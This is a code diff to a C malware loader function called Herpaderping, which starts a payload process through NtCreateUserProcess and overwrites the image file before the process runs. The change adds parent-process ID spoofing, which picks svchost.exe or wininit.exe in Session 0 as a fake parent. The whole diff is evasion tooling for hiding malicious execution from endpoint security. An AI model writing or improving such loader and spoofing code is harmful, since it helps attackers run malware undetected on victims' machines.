@@ -444,16 +444,22 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	createInfo.Size = sizeof(createInfo);
 	createInfo.State = PsCreateInitialState;
 
-	// PS_ATTRIBUTE_LIST — image name points to temp file containing payload
+	// B3 — PPID Spoofing: find svchost.exe/wininit.exe in Session 0
+	HANDLE hParent = GetNonJobParent();
+
+	// PS_ATTRIBUTE_LIST — image name + parent process (PPID spoof)
 	UNICODE_STRING uNtImagePath;
 	pRtlInitUnicodeString(&uNtImagePath, ntImagePath);
 
 	PS_ATTRIBUTE_LIST attrList;
 	memset(&attrList, 0, sizeof(attrList));
-	attrList.TotalLength = sizeof(SIZE_T) + sizeof(PS_ATTRIBUTE);
+	attrList.TotalLength = sizeof(SIZE_T) + 2 * sizeof(PS_ATTRIBUTE);
 	attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
 	attrList.Attributes[0].Size = uNtImagePath.Length;
 	attrList.Attributes[0].ValuePtr = uNtImagePath.pBuffer;
+	attrList.Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
+	attrList.Attributes[1].Size = sizeof(HANDLE);
+	attrList.Attributes[1].Value = (ULONG_PTR)hParent;
 
 	// NtCreateUserProcess — process + initial thread created atomically
 	// Thread suspended so we can overwrite the file before execution starts
@@ -470,6 +476,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 									  &attrList);
 		spoofer.Deactivate();
 	}
+	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
 	if (!NT_SUCCESS(status))
 	{
 		DBG_PRINT("Herpaderping: NtCreateUserProcess failed (0x%08lx)", status);
